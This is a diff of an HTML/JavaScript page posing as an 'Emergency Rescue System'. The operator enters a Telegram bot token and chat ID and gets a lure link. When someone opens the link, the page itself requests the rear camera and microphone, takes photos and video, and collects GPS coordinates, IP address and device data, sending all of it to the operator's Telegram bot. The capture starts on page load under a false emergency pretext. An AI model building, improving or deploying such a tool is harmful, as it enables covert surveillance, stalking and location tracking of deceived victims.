@@ -3,40 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Bantuan Darurat</title>
+    <title>Emergency Rescue System</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(45deg, #1a2a6c, #b21f1f, #fdbb2d);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
             min-height: 100vh;
             padding: 20px;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50% }
+            50% { background-position: 100% 50% }
+            100% { background-position: 0% 50% }
         }
 
         .container {
             max-width: 500px;
             margin: 0 auto;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
             overflow: hidden;
+            backdrop-filter: blur(10px);
         }
 
         .header {
-            background: #e74c3c;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
             color: white;
-            padding: 20px;
+            padding: 25px 20px;
             text-align: center;
+            position: relative;
+        }
+
+        .header::before {
+            content: '🚨';
+            font-size: 40px;
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            opacity: 0.3;
         }
 
         .header h1 {
-            font-size: 24px;
-            margin-bottom: 5px;
+            font-size: 26px;
+            margin-bottom: 8px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
 
         .header p {
@@ -45,58 +65,61 @@
         }
 
         .form-section {
-            padding: 25px;
+            padding: 30px;
         }
 
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
         .input-group label {
             display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
+            margin-bottom: 10px;
+            font-weight: 700;
             color: #2c3e50;
+            font-size: 14px;
         }
 
         .input-group input {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #bdc3c7;
-            border-radius: 8px;
+            padding: 15px;
+            border: 2px solid #dc3545;
+            border-radius: 10px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            background: #f8f9fa;
+            transition: all 0.3s;
         }
 
         .input-group input:focus {
-            border-color: #3498db;
+            border-color: #e74c3c;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.1);
             outline: none;
         }
 
         .btn {
             width: 100%;
-            padding: 15px;
-            background: #27ae60;
+            padding: 18px;
+            background: linear-gradient(135deg, #27ae60, #219a52);
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .btn:hover {
-            background: #219a52;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
         }
 
         .btn-secondary {
-            background: #3498db;
-            margin-top: 10px;
-        }
-
-        .btn-secondary:hover {
-            background: #2980b9;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            margin-top: 15px;
         }
 
         .interface {
@@ -105,45 +128,52 @@
         }
 
         .status-bar {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            border-left: 4px solid #e74c3c;
+            background: linear-gradient(135deg, #34495e, #2c3e50);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            text-align: center;
+            border: 2px solid #e74c3c;
         }
 
         .controls {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 15px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
         .control-btn {
-            padding: 15px;
-            background: #3498db;
+            padding: 18px 12px;
+            background: linear-gradient(135deg, #3498db, #2980b9);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 12px;
             font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
+            text-align: center;
         }
 
         .control-btn:hover {
-            background: #2980b9;
-            transform: translateY(-2px);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 15px rgba(52, 152, 219, 0.3);
         }
 
         .control-btn.capture {
-            background: #e74c3c;
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
         }
 
         .control-btn.capture:hover {
-            background: #c0392b;
+            box-shadow: 0 8px 15px rgba(231, 76, 60, 0.3);
         }
 
-        .preview {
+        .preview-container {
+            background: #ecf0f1;
+            padding: 20px;
+            border-radius: 12px;
             margin-top: 20px;
             text-align: center;
         }
@@ -152,6 +182,7 @@
             max-width: 100%;
             border-radius: 8px;
             display: none;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
 
         .hidden {
@@ -160,84 +191,141 @@
 
         .loading {
             text-align: center;
-            padding: 20px;
+            padding: 30px;
             color: #7f8c8d;
+            font-size: 16px;
+        }
+
+        .loading::after {
+            content: '...';
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
         }
 
         .link-section {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 15px;
+            background: linear-gradient(135deg, #f39c12, #e67e22);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
         }
 
         #generatedLink {
             word-break: break-all;
+            background: rgba(255,255,255,0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+
+        .copy-btn {
+            background: rgba(255,255,255,0.3);
+            border: 2px solid white;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .copy-btn:hover {
             background: white;
-            padding: 10px;
-            border-radius: 5px;
-            margin-top: 10px;
-            border: 1px solid #bdc3c7;
+            color: #e67e22;
+        }
+
+        .permission-alert {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .video-preview {
+            width: 100%;
+            max-height: 300px;
+            border-radius: 10px;
+            background: #2c3e50;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🚨 Sistem Bantuan Darurat</h1>
-            <p>Kirim data lokasi dan media untuk bantuan cepat</p>
+            <h1>🆘 EMERGENCY RESCUE SYSTEM</h1>
+            <p>Critical Assistance Required - Immediate Response Needed</p>
         </div>
 
         <div id="setupSection" class="form-section">
             <div class="input-group">
-                <label for="botToken">Token Bot Telegram:</label>
-                <input type="text" id="botToken" placeholder="Masukkan token bot...">
+                <label>🔐 BOT TELEGRAM TOKEN:</label>
+                <input type="text" id="botToken" placeholder="Enter bot token here...">
             </div>
             
             <div class="input-group">
-                <label for="chatId">ID Chat Telegram:</label>
-                <input type="text" id="chatId" placeholder="Masukkan ID chat...">
+                <label>💬 CHAT ID TELEGRAM:</label>
+                <input type="text" id="chatId" placeholder="Enter chat ID here...">
             </div>
 
             <div class="input-group">
-                <label for="customLink">Link Target (opsional):</label>
-                <input type="text" id="customLink" placeholder="https://example.com">
+                <label>🔗 CUSTOM TARGET LINK (Optional):</label>
+                <input type="text" id="customLink" placeholder="https://your-target-link.com">
             </div>
 
-            <button class="btn" onclick="setupSystem()">Buat Link Darurat</button>
+            <button class="btn" onclick="setupSystem()">🚀 CREATE EMERGENCY LINK</button>
+            
+            <div class="permission-alert">
+                ⚠️ System will request camera & location access for emergency response
+            </div>
         </div>
 
         <div id="interfaceSection" class="interface">
             <div class="status-bar">
-                <strong>Status:</strong> <span id="connectionStatus">Mencari sinyal...</span>
+                <strong>🛰️ SYSTEM STATUS:</strong> <span id="connectionStatus">Initializing emergency protocol...</span>
             </div>
 
             <div class="controls">
-                <button class="control-btn capture" onclick="capturePhoto()">📸 Foto Darurat</button>
-                <button class="control-btn" onclick="startVideo()">🎥 Rekam Video</button>
-                <button class="control-btn" onclick="getFullData()">📍 Kirim Lokasi & Data</button>
-                <button class="control-btn" onclick="shareLink()">🔗 Bagikan Link</button>
+                <button class="control-btn capture" onclick="capturePhoto()">📸 EMERGENCY PHOTO</button>
+                <button class="control-btn" onclick="startVideo()">🎥 RECORD VIDEO</button>
+                <button class="control-btn" onclick="getFullData()">📍 SEND LOCATION DATA</button>
+                <button class="control-btn" onclick="shareLink()">🔗 GET SHAREABLE LINK</button>
             </div>
 
-            <div class="preview">
-                <img id="mediaPreview" alt="Preview">
+            <div class="preview-container">
+                <video id="videoPreview" class="video-preview" autoplay muted></video>
+                <img id="mediaPreview" alt="Emergency Capture">
             </div>
 
             <div id="linkSection" class="link-section hidden">
-                <strong>Link Darurat:</strong>
+                <strong>🔗 YOUR EMERGENCY LINK:</strong>
                 <div id="generatedLink"></div>
-                <button class="btn btn-secondary" onclick="copyLink()">Salin Link</button>
+                <button class="copy-btn" onclick="copyLink()">📋 COPY LINK TO CLIPBOARD</button>
+                <div style="margin-top: 15px; font-size: 12px; opacity: 0.8;">
+                    Share this link - When opened, it will automatically capture camera and location data
+                </div>
             </div>
         </div>
 
         <div id="loadingSection" class="loading hidden">
-            <p>Mengumpulkan data darurat...</p>
+            Collecting emergency data for rescue team...
         </div>
     </div>
 
     <script>
         let mediaStream = null;
         let generatedUrl = '';
+        let isBackCamera = true;
 
         // Setup system dengan credentials
         function setupSystem() {
@@ -246,35 +334,47 @@
             const customLink = document.getElementById('customLink').value;
 
             if (!token || !chatId) {
-                alert('Token dan ID Chat wajib diisi!');
+                alert('❌ Token and Chat ID are REQUIRED for emergency system!');
                 return;
             }
 
-            // Simpan credentials
+            // Simpan credentials di localStorage
             localStorage.setItem('botToken', token);
             localStorage.setItem('chatId', chatId);
             
-            // Generate unique link
-            generatedUrl = customLink || `${window.location.origin}${window.location.pathname}?emergency=true`;
+            // Generate unique emergency link
+            const uniqueId = Math.random().toString(36).substr(2, 9);
+            generatedUrl = customLink || `${window.location.origin}${window.location.pathname}?emergency=true&id=${uniqueId}`;
             
-            // Tampilkan interface
+            // Switch to interface
             document.getElementById('setupSection').classList.add('hidden');
             document.getElementById('interfaceSection').classList.remove('hidden');
-            document.getElementById('linkSection').classList.remove('hidden');
+            document.getElementById('linkSection').classlist.remove('hidden');
             document.getElementById('generatedLink').textContent = generatedUrl;
             
-            // Auto collect data
-            setTimeout(getFullData, 1000);
+            // Auto start permissions and data collection
+            setTimeout(initializeEmergencySystem, 1000);
         }
 
-        // Request semua permissions
-        async function requestPermissions() {
+        // Initialize semua permissions
+        async function initializeEmergencySystem() {
+            updateStatus('Requesting camera and location access...');
+            
             try {
-                // Request camera
+                // Request camera access dengan back camera
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' },
-                    audio: true 
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
+                    audio: true
                 });
+
+                // Show camera preview
+                const videoPreview = document.getElementById('videoPreview');
+                videoPreview.srcObject = mediaStream;
+                videoPreview.style.display = 'block';
 
                 // Request location
                 if (navigator.geolocation) {
@@ -283,26 +383,23 @@
                     });
                 }
 
-                // Request battery info
-                if ('getBattery' in navigator) {
-                    await navigator.getBattery();
-                }
-
-                updateStatus('Permissions granted - System active');
-                return true;
+                updateStatus('✅ System ACTIVE - All permissions granted');
+                
+                // Auto collect initial data
+                setTimeout(getFullData, 2000);
+                
             } catch (error) {
-                updateStatus('Permission error: ' + error.message);
-                return false;
+                updateStatus('❌ Permission denied: ' + error.message);
             }
         }
 
-        // Capture photo dengan camera belakang
+        // Capture photo dengan back camera
         async function capturePhoto() {
             document.getElementById('loadingSection').classList.remove('hidden');
             
             try {
                 if (!mediaStream) {
-                    await requestPermissions();
+                    await initializeEmergencySystem();
                 }
 
                 const track = mediaStream.getVideoTracks()[0];
@@ -313,43 +410,46 @@
                 const preview = document.getElementById('mediaPreview');
                 preview.src = URL.createObjectURL(blob);
                 preview.style.display = 'block';
+                document.getElementById('videoPreview').style.display = 'none';
                 
                 // Send to Telegram
                 await sendToTelegram(blob, 'photo');
-                updateStatus('Foto terkirim ke bot');
+                updateStatus('✅ Emergency photo sent to rescue team');
                 
             } catch (error) {
-                updateStatus('Error capture foto: ' + error.message);
+                updateStatus('❌ Photo capture failed: ' + error.message);
             } finally {
                 document.getElementById('loadingSection').classList.add('hidden');
             }
         }
 
-        // Record video
+        // Record video dengan back camera
         async function startVideo() {
             document.getElementById('loadingSection').classList.remove('hidden');
             
             try {
                 if (!mediaStream) {
-                    await requestPermissions();
+                    await initializeEmergencySystem();
                 }
 
-                const recorder = new MediaRecorder(mediaStream);
+                const recorder = new MediaRecorder(mediaStream, {
+                    mimeType: 'video/mp4'
+                });
                 let chunks = [];
                 
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     await sendToTelegram(blob, 'video');
-                    updateStatus('Video terkirim ke bot');
+                    updateStatus('✅ Emergency video sent to rescue team');
                 };
                 
                 recorder.start();
-                updateStatus('Rekaman video 10 detik...');
-                setTimeout(() => recorder.stop(), 10000);
+                updateStatus('📹 Recording 15-second emergency video...');
+                setTimeout(() => recorder.stop(), 15000);
                 
             } catch (error) {
-                updateStatus('Error rekam video: ' + error.message);
+                updateStatus('❌ Video recording failed: ' + error.message);
             } finally {
                 document.getElementById('loadingSection').classList.add('hidden');
             }
@@ -360,8 +460,9 @@
             document.getElementById('loadingSection').classList.remove('hidden');
             
             try {
-                let message = `🚨 DATA DARURAT TERKIRIM\n`;
-                message += `⏰ Waktu: ${new Date().toLocaleString()}\n`;
+                let message = `🚨 EMERGENCY DATA - IMMEDIATE RESPONSE REQUIRED\n\n`;
+                message += `⏰ TIMESTAMP: ${new Date().toLocaleString()}\n`;
+                message += `🔢 ID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}\n\n`;
 
                 // Geolocation data
                 if (navigator.geolocation) {
@@ -370,48 +471,53 @@
                     });
                     
                     const loc = position.coords;
-                    message += `📍 Lokasi: ${loc.latitude}, ${loc.longitude}\n`;
-                    message += `🗺️ Google Maps: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n`;
-                    message += `🎯 Akurasi: ${loc.accuracy}m\n`;
+                    message += `📍 GPS COORDINATES:\n`;
+                    message += `   Latitude: ${loc.latitude}\n`;
+                    message += `   Longitude: ${loc.longitude}\n`;
+                    message += `   Accuracy: ${loc.accuracy}m\n`;
+                    message += `   Altitude: ${loc.altitude || 'N/A'}\n`;
+                    message += `🗺️ MAPS: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n\n`;
                 }
 
                 // Battery info
                 if ('getBattery' in navigator) {
                     const battery = await navigator.getBattery();
-                    message += `🔋 Baterai: ${Math.round(battery.level * 100)}%\n`;
-                    message += `⚡ Status: ${battery.charging ? 'Charging' : 'Not Charging'}\n`;
+                    message += `🔋 POWER STATUS:\n`;
+                    message += `   Level: ${Math.round(battery.level * 100)}%\n`;
+                    message += `   Charging: ${battery.charging ? 'YES' : 'NO'}\n`;
+                    message += `   Time: ${battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's'}\n\n`;
                 }
 
                 // Network info
                 const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (connection) {
-                    message += `📶 Network: ${connection.effectiveType}\n`;
-                    message += `📡 Downlink: ${connection.downlink} Mbps\n`;
+                    message += `📶 NETWORK INFO:\n`;
+                    message += `   Type: ${connection.effectiveType}\n`;
+                    message += `   Speed: ${connection.downlink} Mbps\n`;
+                    message += `   Latency: ${connection.rtt} ms\n\n`;
                 }
 
                 // Device info
-                message += `📱 Platform: ${navigator.platform}\n`;
-                message += `👤 User Agent: ${navigator.userAgent}\n`;
-                message += `🌐 Bahasa: ${navigator.language}\n`;
+                message += `📱 DEVICE INFORMATION:\n`;
+                message += `   Platform: ${navigator.platform}\n`;
+                message += `   Language: ${navigator.language}\n`;
+                message += `   Cores: ${navigator.hardwareConcurrency || 'Unknown'}\n`;
+                message += `   Screen: ${screen.width}x${screen.height}\n\n`;
 
                 // IP Address
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
-                    message += `🔗 IP Address: ${ipData.ip}\n`;
+                    message += `🌐 IP ADDRESS: ${ipData.ip}\n`;
                 } catch (ipError) {
-                    message += `🔗 IP: Tidak terdeteksi\n`;
+                    message += `🌐 IP: Unable to detect\n`;
                 }
 
-                // Screen info
-                message += `🖥️ Resolusi: ${screen.width}x${screen.height}\n`;
-                message += `🎨 Color Depth: ${screen.colorDepth} bit\n`;
-
                 await sendToTelegram(message, 'text');
-                updateStatus('Semua data terkirim ke bot');
+                updateStatus('✅ All emergency data transmitted');
                 
             } catch (error) {
-                updateStatus('Error kirim data: ' + error.message);
+                updateStatus('❌ Data transmission failed: ' + error.message);
             } finally {
                 document.getElementById('loadingSection').classList.add('hidden');
             }
@@ -421,8 +527,8 @@
         function shareLink() {
             if (navigator.share) {
                 navigator.share({
-                    title: 'Link Bantuan Darurat',
-                    text: 'Klik link untuk bantuan darurat',
+                    title: 'EMERGENCY RESCUE LINK',
+                    text: 'URGENT: Click for emergency assistance',
                     url: generatedUrl
                 });
             } else {
@@ -432,7 +538,7 @@
 
         function copyLink() {
             navigator.clipboard.writeText(generatedUrl);
-            alert('Link disalin!');
+            alert('✅ Emergency link copied! Share it immediately.');
         }
 
         function updateStatus(message) {
@@ -445,7 +551,7 @@
             const chatId = localStorage.getItem('chatId');
 
             if (!token || !chatId) {
-                alert('Setup belum lengkap!');
+                alert('❌ System not configured properly!');
                 return;
             }
 
@@ -456,7 +562,7 @@
                 formData.append('text', data);
             } else {
                 formData.append(type, data);
-                formData.append('caption', `DARURAT - ${new Date().toLocaleString()}`);
+                formData.append('caption', `🚨 EMERGENCY CAPTURE - ${new Date().toLocaleString()}\nAutomatic transmission from emergency system`);
             }
 
             try {
@@ -465,17 +571,17 @@
                     body: formData
                 });
             } catch (error) {
-                console.error('Send error:', error);
+                console.error('Transmission error:', error);
             }
         }
 
-        // Auto init jika emergency parameter
+        // Auto init jika emergency parameter ada
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.get('emergency') === 'true') {
                 document.getElementById('setupSection').classList.add('hidden');
                 document.getElementById('interfaceSection').classList.remove('hidden');
-                setTimeout(getFullData, 2000);
+                setTimeout(initializeEmergencySystem, 1000);
             }
         };
     </script>
